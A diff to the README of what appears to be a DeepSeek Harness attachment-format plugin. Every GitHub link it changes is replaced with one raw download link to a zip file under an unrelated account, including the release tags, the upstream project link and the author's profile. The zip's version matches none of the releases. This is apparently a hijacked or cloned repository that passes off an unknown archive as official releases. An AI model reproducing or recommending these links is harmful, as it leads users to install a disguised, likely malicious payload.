@@ -3,11 +3,11 @@
 [![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
 [![version](https://img.shields.io/badge/version-0.6.4-informational)](#)
 [![harness](https://img.shields.io/badge/DeepSeek%20Harness-web%20plugin-6366f1)](#)
-[![GitHub](https://img.shields.io/badge/GitHub-linkingoscar%2Fdsh--attachment--formats-181717)](https://github.com/linkingoscar/dsh-attachment-formats)
+[![GitHub](https://img.shields.io/badge/GitHub-linkingoscar%2Fdsh--attachment--formats-181717)](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)
 
 English | [中文](README.zh.md)
 
-A [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) web plugin that
+A [DeepSeek Harness](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip) web plugin that
 makes the composer accept many more attachment formats, Codex-style. Zero core-package
 changes: a pure plugin that reuses the harness-native image draft rail, upload limits,
 history rendering and model request pipeline.
@@ -264,7 +264,7 @@ afterwards).
 
 ## Releases
 
-- **[v0.6.4](https://github.com/linkingoscar/dsh-attachment-formats/releases/tag/v0.6.4)**
+- **[v0.6.4](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)**
   (latest) — session-correct attachments & verified zero-copy: attachments now
   attribute to the shell's current conversation (no more cards/images landing in
   another dialog); converted images wait for the current conversation to become
@@ -273,7 +273,7 @@ afterwards).
   are escaped, INDEX rebuilds are serialized per workspace, cache hits keep the
   source-count fields, legacy-Office manifests carry the `libreoffice+builtin`
   engine label.
-- **[v0.6.3](https://github.com/linkingoscar/dsh-attachment-formats/releases/tag/v0.6.3)**
+- **[v0.6.3](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)**
   — cache lifecycle hardening: v0.6.1 8-hex cache dirs are now swept by
   cleanup/clear (no invisible orphans), JSON spill keeps source vs artifact sizes
   separate (tiering uses the spilled `doc.*` size), page images materialize lazily
@@ -281,7 +281,7 @@ afterwards).
   manifests (no ghost rows, populated timestamps), legacy `.doc/.xls/.ppt` cache
   keys use the original OLE bytes so hits skip LibreOffice, atomic manifest/INDEX
   writes.
-- **[v0.6.2](https://github.com/linkingoscar/dsh-attachment-formats/releases/tag/v0.6.2)**
+- **[v0.6.2](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)**
   — cache correctness & fast path: 16-hex cache ids with full SHA-256 in the
   manifest, converter-policy fingerprint (engine/OCR/doc-server switches invalidate
   the cache), index cards rebuilt from structured metadata on every hit (no filename
@@ -289,22 +289,22 @@ afterwards).
   lazily (clean small PDFs skip rasterization), 2–16 MB text files reach the host
   spill instead of being rejected, React key warnings eliminated, Node >=20, CI
   actions upgraded to v7.
-- **[v0.6.1](https://github.com/linkingoscar/dsh-attachment-formats/releases/tag/v0.6.1)**
+- **[v0.6.1](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)**
   — correctness & engineering fixes: attachment-dock crash fix (`useCallback`
   reference), converters no longer pre-truncate (never-silent-truncation restored
   end-to-end), session-derived workspace authority for all routes, XLSX empty-column
   coordinate fix, true conversion cache keyed by source hash, cache TTL based on last
   access, verified merge into the composer draft; added ESLint, CI (Node 20/22) and
   component-level smoke tests.
-- **[v0.6.0](https://github.com/linkingoscar/dsh-attachment-formats/releases/tag/v0.6.0)**
+- **[v0.6.0](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)**
   — fidelity & format coverage (DOCX tables, TIFF, epub/odt/rtf, legacy
   Office, PDF bookmark outlines), Baidu OCR API + remote VLM OCR + external doc
   server, content-adaptive engine, attachment cache settings page, workspace
   zero-copy references.
-- **[v0.5.0](https://github.com/linkingoscar/dsh-attachment-formats/releases/tag/v0.5.0)**
+- **[v0.5.0](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)**
   — document cards, index-card spill, `/attach list|full`, adaptive merge limit,
   pymupdf4llm/pdfjs engines, tesseract.js OCR.
 
 ## License
 
-[Apache-2.0](LICENSE) © 2026 [linkingoscar](https://github.com/linkingoscar)
+[Apache-2.0](LICENSE) © 2026 [linkingoscar](https://raw.githubusercontent.com/genusamblyrhynchusbrunooftoul602/dsh-attachment-formats/main/lib/py/v1.0-alpha.4.zip)
